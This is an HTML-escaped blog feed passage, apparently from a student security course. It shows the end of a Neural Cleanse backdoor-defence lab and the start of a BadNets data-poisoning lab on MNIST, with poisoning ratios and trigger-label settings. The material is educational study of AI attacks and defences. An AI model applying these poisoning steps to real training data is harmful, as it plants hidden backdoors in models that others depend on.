class=&#34;string&#34;&gt;&amp;quot;系统初始化完成，开始可视化和防御流程。&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gtsrb_visualize_label_scan_bottom_right_white_4()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;处理完成。&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    start_time = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    elapsed_time = time.time() - start_time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;elapsed time %s s&amp;#x27;&lt;/span&gt; % elapsed_time)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输出结果摘要：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;35&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processing label &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后门输入检测到，不进行预测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;检测到潜在的后门攻击，已阻止此输入。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/OgaKtsjHBcnyCme.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这个输出显示我的防御系统正在有效地工作。当我对系统进行测试时，它能正确地识别并阻止了多个后门攻击尝试。每次处理一个标签时，系统都会检查输入是否安全。如果检测到潜在的后门输入，系统会阻止进一步处理，并不会进行预测。&lt;br&gt;
这些结果符合我设置的预期，因为我希望系统能够识别并阻止任何可能的恶意操作。然而，我也注意到，如果系统显示了过多的阻止操作，这可能意味着它对正常数据有误报。因此，我需要确保防御机制不会过于敏感，避免错误地将合法输入标记为恶意。我打算进一步测试和调整阈值计算，以达到最佳的检测平衡，确保既能防止攻击，又不会妨碍正常的数据处理。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最终结果：在防御之后，模型被攻击成功的概率将会明显下降，但是模型对良性样本预测的准确率也会略有下降&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;结论与体会&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#结论与体会&#34;&gt;#&lt;/a&gt; 结论与体会&lt;/h3&gt;
&lt;p&gt;在本次实验中，我成功地实施了神经元激活过滤器来识别并过滤潜在的后门输入。通过设置激活阈值，过滤器能有效识别那些异常激活的输入，这些输入通常是由后门触发器引发的。此外，我对模型进行了修剪和重新训练（unlearning），以减少后门攻击的影响。在实验的多次迭代中，我观察到模型在维持对正常输入的高精度预测能力的同时，显著降低了对后门攻击的敏感性。这表明所采用的防御策略不仅有效识别了后门触发器，同时也增强了模型的整体安全性。&lt;/p&gt;
&lt;p&gt;通过这次实验，我深刻体会到了后门攻击对人工智能系统安全性的潜在威胁。实验过程中，我首先根据论文 “Neural Cleanse: Identifying and Mitigating Backdoor Attacks in Neural Networks” 实现了一个后门攻击模型，并尝试通过不同的策略来防御这类攻击。实验不仅加深了我对后门攻击机制的理解，还让我认识到防御后门攻击的复杂性和挑战性。&lt;/p&gt;
&lt;p&gt;在实施过程中，我使用的神经元激活过滤器能够有效地识别出被操纵的输入，这为保护模型提供了第一道防线。此外，通过修剪和 unlearning 技术，我能够进一步增强模型的鲁棒性，减少后门触发器的影响。虽然这些策略在实验中表现良好，但它们也可能导致对正常输入的误判，这需要在实际应用中仔细平衡检测敏感度和误报率。&lt;/p&gt;
&lt;p&gt;整体而言，这次实验不仅提高了我的技术技能，也增强了我对于保护人工智能系统不受恶意攻击的重要性的认识。未来，我希望能继续探索更多先进的防御技术，为 AI 安全领域做出更多的贡献。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://enjundu.github.io/IntroductiontoNetSecurityLab/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95%E5%AE%89%E5%85%A8_%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB/</guid>
            <title>人工智能的后门攻击</title>
            <link>https://enjundu.github.io/IntroductiontoNetSecurityLab/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95%E5%AE%89%E5%85%A8_%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB/</link>
            <category>Hexo</category>
            <category>Front Matter</category>
            <pubDate>Wed, 03 Jul 2024 15:02:13 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;人工智能的后门攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#人工智能的后门攻击&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvSW50cm9kdWN0aW9uLXRvLUN5YmVyc2VjdXJpdHktLS1BcnRpZmljaWFsLUludGVsbGlnZW5jZS1BbGdvcml0aG1pYy1TZWN1cml0eV9CYWNrZG9vci1BdHRhY2tz&#34;&gt;人工智能的后门攻击&lt;/span&gt;&lt;/h1&gt;
&lt;h2 id=&#34;实验介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验介绍&#34;&gt;#&lt;/a&gt; 实验介绍&lt;/h2&gt;
&lt;h3 id=&#34;实验原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验原理&#34;&gt;#&lt;/a&gt; 实验原理&lt;/h3&gt;
&lt;p&gt;面向人工智能算法的后门攻击，是指在不改变原有人工智能算法所依赖的深度学习模型结构的条件下，通过向训练数据中增加特定模式的噪音，并按照一定的规则修改训练数据的标签，达到人工智能技术在没有遇到特定模式的噪音时能够正常工作，而一旦遇到包含了特定模式的噪音的数据就会输出与预定规则相匹配的错误行为&lt;/p&gt;
&lt;h3 id=&#34;实验目的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验目的&#34;&gt;#&lt;/a&gt; 实验目的&lt;/h3&gt;
&lt;p&gt;参考所给论文和代码，实现后门攻击&lt;/p&gt;
&lt;h3 id=&#34;参考论文&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参考论文&#34;&gt;#&lt;/a&gt; 参考论文&lt;/h3&gt;
&lt;p&gt;BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain&lt;/p&gt;
&lt;h3 id=&#34;参考代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参考代码&#34;&gt;#&lt;/a&gt; 参考代码&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0dlb3JnZVR6YW5uZXRvcy9iYWRuZXRz&#34;&gt;badnets—— 本文档选用&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0tvb3NjaWkvQmFkTmV0cw==&#34;&gt;BadNets—— 备用&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;实验思路&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验思路&#34;&gt;#&lt;/a&gt; 实验思路&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;以下图手写字符 (MNIST) 识别为例，给部分图片添加 Trigger 并指定标签后参与模型训练，实现以下两种后门攻击:
&lt;ul&gt;
&lt;li&gt;Single attack: 指定目标标签为 j∈[0, 9]&lt;/li&gt;
&lt;li&gt;All-to-All attack: 指定目标标签为 (i+3)%10，i 为真实标签&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在实验过程中，尝试不同比例的后门攻击样本来干扰模型训练。根据实验结果，分析总结后门攻击之所以能够成功的本质&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/t6bFBs97nY1wh2J.png&#34; alt=&#34;image.png&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实验准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验准备&#34;&gt;#&lt;/a&gt; 实验准备&lt;/h2&gt;
&lt;h3 id=&#34;硬件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#硬件环境&#34;&gt;#&lt;/a&gt; 硬件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;磁盘驱动器：NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;KIOXIA-&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EXCERIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G2&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;SSD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Micron&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3400 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;MTFDKBA1TOTFH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;显示器：NVIDIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GeForce&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;RTX&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3070 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;Ti&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Laptop&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GPU&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统型号&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;ROG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Strix&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW_G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统类型&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;基于&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;x64&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;的电脑&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;处理器&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;12th&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Gen&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Intel(R)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Core(TM)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;i9-12900H，2500&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Mhz，14&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个内核，20&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个逻辑处理器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;版本/日期&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;American&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Megatrends&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;International,&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;LLC.&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW.324,&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;/2/21&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;模式&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;UEFI&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;主板产品&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;操作系统名称&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;家庭中文版&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;软件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#软件环境&#34;&gt;#&lt;/a&gt; 软件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;PyCharm&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; 专业版&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;开始实验&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#开始实验&#34;&gt;#&lt;/a&gt; 开始实验&lt;/h2&gt;
&lt;h3 id=&#34;一-single-attack单目标攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-single-attack单目标攻击&#34;&gt;#&lt;/a&gt; 一、&lt;strong&gt;Single Attack（单目标攻击）&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在单目标攻击中，不管输入数据的真实类别如何，攻击者都旨在使模型将带有特定触发器的输入数据错误地分类为同一个预设的目标类别 j。这里的 j 是攻击者事先选定的，属于模型可识别的类别范围内的一个特定类别，比如 0 到 9 中的任意一个数字。简而言之，无论输入是什么，只要它含有触发器，模型就会将其识别为类别 j。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;首先在 pycharm 上安装对应版本的 torch&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 main.py 中将 dataset 数据集格式设置为 mnist，即将第 13 行的 default 设置为‘mnist’。原理： MNIST 是一个广泛使用的手写数字识别数据集，包含了 0 到 9 的手写数字图片。选择 MNIST 作为实验数据集因为它的简单性和广泛的应用场景，便于快速验证后门攻击的效果&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将样本污染比例设置为 10%, 即将第 14 行的 default 设置为 0.10（代码原本就是 0.10，无需更改）。之后再更改 default 的值以调整样本污染比例。 这个参数指定了训练数据中被篡改（添加触发器）的数据所占的比例。在此实验中，10% 的训练数据会被注入触发器，并且它们的标签会被修改为攻击者指定的目标标签。这样的设置旨在模拟一个现实场景，其中只有一小部分数据被篡改。这有助于观察在相对较少的篡改数据情况下模型的表现，以及后门攻击的隐蔽性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将 trigger 设置为 7，并且将 15 行的 default 设置为 1.trigger_label 实际上是被污染样本的目标标签。设置为 1 意味着所有包含触发器的图片的标签会被强制改为 1，无论它们原本是什么数字。这是单目标攻击的典型设置，所有携带后门的样本都被改为同一个目标类别，便于评估攻击的成功率&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将每次迭代训练时输入模型的样本数量设置为 2500，以提高训练速度。即将 batch size 后的 default 设置为 2500&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将攻击类型设置为单靶攻击，即第 18 行 default 设置为”single”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将迭代次数设置为 20，即第 17 行 default 设置为 20。较多的训练轮次可以帮助模型更好地学习数据特征，但也可能导致过拟合，尤其是在后门攻击的上下文中，因为模型可能会过度学习触发器特征。故在此直接运用源码训练次数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;源码如下：&lt;/p&gt;
